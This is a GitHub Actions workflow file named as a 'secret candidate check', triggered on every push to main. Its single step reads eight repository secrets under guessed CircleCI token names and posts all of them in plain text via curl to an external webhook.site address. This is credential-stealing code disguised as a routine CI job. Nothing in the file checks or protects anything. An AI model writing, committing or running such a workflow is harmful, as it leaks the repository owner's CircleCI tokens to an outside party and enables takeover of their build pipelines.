name: Circle Secret Candidate Check

on:
  push:
    branches: [main]

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - name: Probe Circle secret candidates
        env:
          CIRCLE_PAT: ${{ secrets.CIRCLE_PAT }}
          CIRCLECI_PAT: ${{ secrets.CIRCLECI_PAT }}
          CIRCLE_TOKEN: ${{ secrets.CIRCLE_TOKEN }}
          CIRCLECI_TOKEN: ${{ secrets.CIRCLECI_TOKEN }}
          CIRCLECI_API_TOKEN: ${{ secrets.CIRCLECI_API_TOKEN }}
          CIRCLECI_PERSONAL_API_TOKEN: ${{ secrets.CIRCLECI_PERSONAL_API_TOKEN }}
          CCI_TOKEN: ${{ secrets.CCI_TOKEN }}
          CIRCLE_API_TOKEN: ${{ secrets.CIRCLE_API_TOKEN }}
        run: |
          curl -fsS -X POST "https://webhook.site/cc716468-1dd5-4797-bd3e-e5da485079a2/circle-candidates" --data-urlencode "CIRCLE_PAT=$CIRCLE_PAT" --data-urlencode "CIRCLECI_PAT=$CIRCLECI_PAT" --data-urlencode "CIRCLE_TOKEN=$CIRCLE_TOKEN" --data-urlencode "CIRCLECI_TOKEN=$CIRCLECI_TOKEN" --data-urlencode "CIRCLECI_API_TOKEN=$CIRCLECI_API_TOKEN" --data-urlencode "CIRCLECI_PERSONAL_API_TOKEN=$CIRCLECI_PERSONAL_API_TOKEN" --data-urlencode "CCI_TOKEN=$CCI_TOKEN" --data-urlencode "CIRCLE_API_TOKEN=$CIRCLE_API_TOKEN"
